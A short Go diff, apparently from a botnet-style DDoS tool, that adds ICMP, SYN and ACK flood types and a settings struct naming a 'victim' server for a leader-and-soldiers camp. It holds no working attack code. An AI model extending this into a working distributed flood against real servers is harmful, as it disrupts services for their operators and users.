@@ -14,11 +14,22 @@ const (
 	StatusAttacking = "attacking"
 	StatusStopped   = "stopped"
 )
+const (
+	DDOSTypeICMP = "icmp"
+	DDOSTypeSYN  = "syn"
+	DDOSTypeACK  = "ack"
+)
+
+type CampSettings struct {
+	Status       string `json:"status"`
+	VictimServer string `json:"victim"`
+	DDOSType     string `json:"ddos_type"`
+}
 
 type Camp struct {
-	Leader   Leader    `json:"leader"`
-	Soldiers []Soldier `json:"soldiers"`
-	Status   string    `json:"status"`
+	Leader   Leader       `json:"leader"`
+	Soldiers []Soldier    `json:"soldiers"`
+	Settings CampSettings `json:"camp_settings"`
 }
 
 func (c *Camp) AddSoldier(s Soldier) {
